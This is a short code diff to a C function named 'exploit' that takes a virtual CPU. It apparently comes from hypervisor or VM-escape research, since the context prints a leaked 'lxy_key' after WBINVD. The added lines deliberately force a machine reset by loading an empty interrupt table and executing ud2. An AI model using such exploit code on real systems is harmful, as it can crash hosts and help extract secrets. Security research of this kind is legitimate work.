@@ -58,6 +58,13 @@ void exploit(VCPU *vcpu) {
 	wbinvd();
 	printf("WBINVD complete, lxy_key = 0x%016llx\n", lxy_key);
 
+	for (int i = 0; i < 0x10000000; i++) {
+		asm volatile ("pause");
+	}
+
+	printf("Restarting");
+	asm volatile ("pushq $0; pushq $0; lidt (%rsp); ud2;");
+
 	HALT();
 }
 
